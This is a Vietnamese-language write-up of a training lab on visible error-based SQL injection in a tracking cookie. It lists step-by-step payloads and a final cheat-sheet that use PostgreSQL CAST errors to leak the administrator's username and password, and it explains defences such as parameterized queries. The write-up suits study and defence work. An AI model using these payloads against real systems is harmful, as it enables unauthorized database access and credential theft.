# Lab 18 — Visible Error-Based SQL Injection

## Mục tiêu
Khai thác lỗ hổng SQLi trong cookie `TrackingId` để ép DB throw lỗi convert kiểu có chủ đích, đọc dữ liệu (username/password của `administrator`) trực tiếp qua nội dung error message, sau đó đăng nhập.

---

## 1. Bản chất lỗ hổng

**Root cause:** Cookie `TrackingId` bị nối chuỗi trực tiếp vào câu SQL backend (`WHERE id = '<cookie>'`), không qua parameterized query. Input được DB parser đọc thành cú pháp SQL thay vì dữ liệu thuần.

**Điểm khác biệt cốt lõi so với Lab 12 (Conditional Errors):**
- Conditional Errors: chỉ tạo tín hiệu **true/false** qua HTTP status (200/500) — 1 bit/request
- Visible Error-Based: DB **in kèm chính giá trị gây lỗi** vào error message → đọc được **nguyên 1 giá trị/request**, không cần brute-force từng ký tự

**DBMS xác định được:** PostgreSQL — nhận diện qua chữ ký lỗi đặc trưng `ERROR: ... Position: N` (khác Oracle `ORA-xxxxx`, MySQL "You have an error in your SQL syntax", MSSQL "Incorrect syntax near...")

---

## 2. Quy trình khai thác (từng bước đã thực hiện)

| # | Việc làm | Payload | Kết quả |
|---|---|---|---|
| 1 | Xác nhận injectable bằng dấu nháy đơn | `ogAZZfxtOKUELbuJ'` | 500 — "Unterminated string literal", lộ query gốc `SELECT * FROM tracking WHERE id = '...'` |
| 2 | Vá cú pháp bằng comment | `...' --` | 200 OK — xác nhận query hợp lệ trở lại |
| 3 | Test CAST cơ bản (chưa có so sánh boolean) | `...' AND CAST((SELECT 1) AS int)--` | 500 — `argument of AND must be type boolean, not type integer` |
| 4 | Thêm phép so sánh `1=` để tạo boolean expression | `...' AND 1=CAST((SELECT 1) AS int)--` | 200 OK — query hợp lệ |
| 5 | Đổi sang subquery lấy username thật | `...' AND 1=CAST((SELECT username FROM users) AS int)--` | 500 — nhưng bị **truncate do giới hạn ký tự** của cookie, mất phần `--` |
| 6 | Xóa/rút gọn giá trị TrackingId gốc để giải phóng ký tự | `a' AND 1=CAST((SELECT username FROM users) AS int)--` | 500 — `more than one row returned by a subquery used as an expression` |
| 7 | Thêm `LIMIT 1` để ép subquery trả về đúng 1 dòng | `a' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` | 500 — **leak thành công**: `invalid input syntax for type integer: "administrator"` |
| 8 | Đổi cột `username` → `password` | `a' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` | 500 — leak password thật của `administrator` |
| 9 | Đăng nhập | Username: `administrator` / Password: chuỗi vừa leak | Lab solved |

---

## 3. Cơ chế CAST oracle — vì sao hoạt động

```sql
AND 1 = CAST((SELECT <cột> FROM <bảng> LIMIT 1) AS int)
```

- `CAST(text AS int)` ép 1 giá trị text (username/password...) sang kiểu `int` không tương thích → PostgreSQL throw lỗi convert
- PostgreSQL **in kèm chính giá trị gây lỗi** vào message (`invalid input syntax for type integer: "<giá_trị_thật>"`) → biến lỗi thành **kênh rò rỉ dữ liệu trực tiếp**
- Khác biệt cốt lõi so với Conditional Errors: ở đây **không quan tâm** `1 = CAST(...)` đúng hay sai về mặt logic — mục tiêu là ép lỗi xảy ra để đọc nội dung, không phải để so sánh 2 trạng thái true/false
- `LIMIT 1` bắt buộc để tránh lỗi "more than one row" che mất lỗi CAST thật sự muốn thấy (tương đương `ROWNUM=1` ở Oracle Lab 12, khác cú pháp nhưng cùng mục đích)

---

## 4. Bug/lỗi kỹ thuật đã gặp và cách sửa (rất quan trọng để nhớ)

| Lỗi gặp phải | Nguyên nhân | Cách sửa |
|---|---|---|
| `syntax error at or near "CAST"` | Thiếu từ khóa `AND` nối giữa `id='...'` và `CAST(...)` — 2 mệnh đề đứng cạnh nhau không có toán tử liên kết | Thêm `AND` đầy đủ trước `CAST` |
| 200 OK ở payload tưởng chừng sai cú pháp | Gõ nhầm `''` (2 dấu nháy) thay vì `'` (1 dấu) → `''` là ký tự escape đại diện 1 dấu nháy **bên trong** chuỗi, không đóng chuỗi → toàn bộ phần sau bị hiểu nhầm là literal text, không phải cú pháp SQL → false positive, chưa test được gì | Kiểm tra kỹ ở tab **Raw** (không phải Pretty) để đếm chính xác số dấu nháy |
| `argument of AND must be type boolean, not type integer` | PostgreSQL **không** tự ép ngầm int→boolean (khác MySQL coi số khác 0 là TRUE) | Thêm phép so sánh `1=CAST(...)` để tạo ra biểu thức boolean thật sự |
| `Unterminated string literal` khi đổi sang subquery `users` | Payload bị **truncate do character limit** của cookie — phần `AS int)--` phía cuối bị cắt mất | Rút ngắn/xóa giá trị TrackingId gốc để nhường chỗ ký tự cho phần payload thật |
| `more than one row returned by a subquery used as an expression` | Bảng `users` có nhiều dòng, subquery không giới hạn trả về nhiều giá trị trong khi vị trí chỉ chấp nhận 1 giá trị scalar | Thêm `LIMIT 1` (cú pháp PostgreSQL — khác `ROWNUM=1` của Oracle) |

---

## 5. So sánh nhanh: Visible Error-Based vs Conditional Errors (Lab 12) vs Conditional Responses (Lab 11)

| Đặc điểm | Lab 11 (Conditional Responses) | Lab 12 (Conditional Errors) | Lab 18 (Visible Error-Based) |
|---|---|---|---|
| Tín hiệu | Nội dung khác biệt (`Welcome back` có/không) | HTTP status khác biệt (200/500) | Nội dung error message chứa **giá trị thật** |
| Tốc độ extract | 1 bit/request (cần Intruder dò từng ký tự) | 1 bit/request (cần Intruder dò từng ký tự) | **Nguyên 1 giá trị/request** — không cần Intruder |
| DBMS trong lab | Không xác định rõ | Oracle | PostgreSQL |
| Kỹ thuật cốt lõi | `AND (subquery) = 'giá_trị'` | `CASE WHEN (đk) THEN 1 ELSE 1/0 END` | `CAST(text AS int)` ép lỗi type conversion |
| Yêu cầu điều kiện | Response phân biệt theo số dòng trả về | Không suppress lỗi DB ở tầng ứng dụng | Không suppress verbose error, DB in giá trị lỗi vào message |

---

## 6. Phòng chống

- **Gốc rễ:** Parameterized query / prepared statement — driver tách kênh code và data ở tầng giao thức, input không bao giờ được parser SQL đọc như cú pháp
- **Bổ sung:** Suppress verbose error message ở production — chặn được kênh leak này cụ thể, nhưng **không vá được lỗ hổng gốc**, injection point vẫn khai thác được qua blind/time-based/OOB
- **Least privilege DB account:** hạn chế thiệt hại nếu injection vẫn xảy ra

---

## 7. Câu hỏi tự kiểm tra

1. Vì sao ép kiểu sai bằng `CAST()` có thể biến một lỗ hổng blind SQLi thành visible (error-based)?
2. Vì sao kỹ thuật này đọc được nguyên 1 giá trị/request, trong khi Boolean-based (Lab 11) và Conditional Errors (Lab 12) chỉ đọc được 1 bit/request — khác biệt nằm ở đâu trong cơ chế oracle của mỗi loại?
3. Vì sao `1=CAST(...)` — dù gần như chắc chắn sai về mặt logic so sánh — vẫn là điều kiện "đúng cách" để khai thác, thay vì cần tìm giá trị làm cho biểu thức thực sự true?
4. Vì sao chỉ suppress verbose error là không đủ để vá lỗ hổng — injection point còn tồn tại theo hướng nào?
5. Vì sao giới hạn độ dài input (character limit) lại là một trở ngại thực tế cần xử lý riêng, tách biệt hoàn toàn với logic đúng/sai của payload SQL?

---

## 8. Payload cuối cùng (cheat-sheet)

```sql
-- Xác nhận injectable
' 

-- Vá cú pháp
'--

-- Test CAST cơ bản (sẽ lỗi vì AND cần boolean)
' AND CAST((SELECT 1) AS int)--

-- CAST hợp lệ với so sánh boolean
' AND 1=CAST((SELECT 1) AS int)--

-- Leak username (LIMIT 1 để tránh lỗi nhiều dòng)
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

-- Leak password
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Kết quả:** `administrator` : `<password leak được từ error message>`
